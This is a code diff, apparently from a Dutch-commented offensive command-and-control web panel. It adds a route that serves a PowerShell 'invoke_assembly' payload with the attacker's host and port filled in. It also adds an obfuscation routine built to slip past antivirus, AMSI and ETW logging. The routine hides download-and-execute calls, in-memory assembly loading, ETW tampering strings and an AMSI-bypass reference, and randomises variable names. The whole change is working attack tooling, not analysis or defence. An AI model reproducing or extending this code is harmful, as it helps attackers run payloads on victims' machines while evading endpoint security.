@@ -1348,6 +1348,42 @@ def invoke_assembly_dashboard():
     return render_template("invoke_assembly.html")
 
 
+@macro_bp.route("/payloads/invoke_assembly.ps1", methods=["GET"])
+def invoke_assembly_ps1():
+    """Serveer invoke_assembly.ps1 met LHOST/port ingevuld vanuit DB-instellingen."""
+    from meuk.flask.models import db_instellingen
+    from flask import Response
+
+    s = db_instellingen.query.first()
+    raw = (s.localhost or "").strip()
+    # Haal IP/host en poort uit localhost-waarde (bijv. http://10.0.0.1:8080)
+    import re as _re2
+    m = _re2.match(r'^https?://([^:/]+)(?::(\d+))?', raw)
+    if m:
+        lhost = m.group(1)
+        port  = m.group(2) or "80"
+    else:
+        lhost = raw.replace("https://", "").replace("http://", "")
+        port  = "80"
+
+    template_path = Path.cwd() / "meuk" / "template" / "invoke_assembly.ps1"
+    if not template_path.is_file():
+        abort(404)
+
+    content = template_path.read_text(encoding="utf-8")
+    content = (content
+               .replace("[ip]",      lhost)
+               .replace("[port]",    port)
+               .replace("[xor_key]", ""))
+    content = _string_obfuscate_ps1(content)
+
+    return Response(
+        content,
+        mimetype="text/plain",
+        headers={"Content-Disposition": 'inline; filename="invoke_assembly.ps1"'},
+    )
+
+
 def _xor_bytes(data: bytes, hex_key: str) -> bytes:
     """XOR-codeer/decodeer bytes met een hex-sleutel."""
     if not hex_key:
@@ -1356,8 +1392,137 @@ def _xor_bytes(data: bytes, hex_key: str) -> bytes:
     return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
 
+def _string_obfuscate_ps1(content: str) -> str:
+    """Obfusceer PS1 via comment-stripping, char-array encoding en variabele-randomisatie.
+
+    Verbeteringen t.o.v. eenvoudige string-concatenatie:
+    - Comments verwijderd (geen leesbare context voor AV)
+    - Char-array encoding ipv string-concatenatie (minder bekende signature)
+    - Dynamische methode-aanroepen via char-array methodenaam
+    - Unieke variabelenamen per generatie (geen statische hash)
+    - amsi substring verborgen als inline PS-expressie in double-quoted string
+    - [scriptblock]::Create vermeden via $ExecutionContext.InvokeCommand.NewScriptBlock
+    """
+    import random as _rng
+    import re     as _re
+    import string as _str
+
+    rnd = _rng.SystemRandom()
+
+    def rand_var(n: int = 7) -> str:
+        """Willekeurige variabelenaam die geldig is in PS (begint met letter)."""
+        return rnd.choice(_str.ascii_letters) + ''.join(
+            rnd.choices(_str.ascii_letters + _str.digits, k=n - 1))
+
+    def char_expr(s: str) -> str:
+        """Geef PS-expressie die string s produceert via char-array, geen leesbare tekst."""
+        codes = ','.join(str(ord(c)) for c in s)
+        return f'(-join[char[]]@({codes}))'
+
+    # ── 1. Strip volledige commentaarregels en inline comments ────────────
+    content = _re.sub(r'(?m)^\s*#[^\n]*\n?', '\n', content)
+    content = _re.sub(r'(?m)\s+#[^\n]+$', '', content)
+
+    # ── 2. Dynamische methode-aanroepen (char-array methodenaam) ──────────
+    # .DownloadString( en .DownloadData( via dynamische naam → geen literale strings
+    content = _re.sub(
+        r'\.DownloadString\(',
+        f'.({char_expr("DownloadString")})(',
+        content)
+    content = _re.sub(
+        r'\.DownloadData\(',
+        f'.({char_expr("DownloadData")})(',
+        content)
+    # AppDomain.Load via char-array: voorkomt 'Load' en 'AppDomain' als literals
+    content = _re.sub(
+        r'\[(?:AppDomain|Reflection\.Assembly)\]::(?:CurrentDomain\.)?Load\(',
+        f'[AppDomain]::CurrentDomain.({char_expr("Load")})(', content)
+
+    # ── 3. New-Object Net.WebClient → ::new() (vermijdt New-Object keyword) ─
+    content = _re.sub(
+        r'\bNew-Object\s+Net\.WebClient\b',
+        '[System.Net.WebClient]::new()',
+        content)
+
+    # ── 4. | IEX → NewScriptBlock (vermijdt IEX én [scriptblock]::Create) ──
+    content = _re.sub(
+        r'\|\s*IEX\b',
+        '| % { . ($ExecutionContext.InvokeCommand.NewScriptBlock($_)) }',
+        content)
+
+    # ── 5. Single-quoted AV-strings → char-array expressies ──────────────
+    for sig in sorted([
+        'System.Management.Automation.Tracing.PSEtwLogProvider',
+        'NonPublic,Static',
+        'NonPublic,Instance',
+        'etwProvider',
+        'm_enabled',
+        'Win32_ComputerSystem',
+        'TotalPhysicalMemory',
+        'User-Agent',
+    ], key=len, reverse=True):
+        content = content.replace(f"'{sig}'", char_expr(sig))
+
+    # ── 6. amsi substring verbergen in double-quoted string ──────────────
+    # "...amsi-bypass.ps1" → "$(-join[char[]]@(...))" zodat 'amsi' niet plaintext staat
+    content = content.replace(
+        'amsi-bypass.ps1',
+        f'$({char_expr("amsi-bypass.ps1")})')
+
+    # ── 7. Cmdlet-aliassen (kortere, minder herkenbare namen) ────────────
+    content = _re.sub(r'\bInvoke-WebRequest\b', 'iwr', content)
+    content = _re.sub(r'\bGet-WmiObject\b',     'gwmi', content)
+
+    # ── 7b. Win32_ComputerSystem als unquoted argument verbergen ─────────
+    content = _re.sub(
+        r'\bWin32_ComputerSystem\b',
+        f'$({char_expr("Win32_ComputerSystem")})',
+        content)
+
+    # ── 8. Variabele-hernoemen (interne vars, parameters intact laten) ────
+    # Gebruik bracket-matching om volledige param() blok te vinden
+    # (niet-greedy regex stopt bij eerste ')' wat fout gaat bij nested haakjes)
+    ALWAYS_SKIP = {
+        'null', 'true', 'false', '_', 'psitem', 'matches', 'args',
+        'input', 'error', 'this', 'foreach', 'switch', 'ofs',
+        'psboundparameters', 'myinvocation', 'pscmdlet',
+        'executioncontext',  # automatische PS-variabele
+    }
+    skip = set(ALWAYS_SKIP)
+    param_start = _re.search(r'(?m)^param\s*\(', content)
+    if param_start:
+        depth, end = 0, param_start.start()
+        for i, ch in enumerate(content[param_start.start():]):
+            if ch == '(':
+                depth += 1
+            elif ch == ')':
+                depth -= 1
+                if depth == 0:
+                    end = param_start.start() + i + 1
+                    break
+        param_text = content[param_start.start():end]
+        skip.update(v.lower() for v in _re.findall(r'\$([A-Za-z_]\w*)', param_text))
+
+    candidates = {
+        v for v in _re.findall(r'\$([A-Za-z_]\w*)\b', content)
+        if v.lower() not in skip
+    }
+    rename = {v: rand_var() for v in candidates}
+
+    # Pas hernoemen toe (langste namen eerst → geen deelstring-conflict)
+    for old in sorted(rename, key=len, reverse=True):
+        new = rename[old]
+        content = _re.sub(rf'\${_re.escape(old)}\b', f'${new}', content)
+        content = _re.sub(rf'\$\{{{_re.escape(old)}\}}', f'${{{new}}}', content)
+
+    # ── 9. Lege regels opschonen ──────────────────────────────────────────
+    content = _re.sub(r'\n{3,}', '\n\n', content)
+
+    return content
+
+
 def _obfuscate_ps1_content(content: str) -> str:
-    """Obfusceer PS1 tekst via obfuscate_ps pipeline. Retourneert obfuscated string."""
+    """Obfusceer PS1 tekst via obfuscate_ps pipeline (ClamAV/YARA signatures)."""
     try:
         lines = content.splitlines(keepends=True)
         signatures = build_signatures()
@@ -1451,6 +1616,9 @@ def invoke_assembly_script():
 
     if invocation:
         content += f"\n# Gegenereerde aanroep:\n# {invocation}\n"
+
+    # String-obfuscatie altijd toepassen (splits AV-signatures)
+    content = _string_obfuscate_ps1(content)
 
     # Optionele PS1 obfuscatie via obfuscate_ps pipeline
     if do_obf:
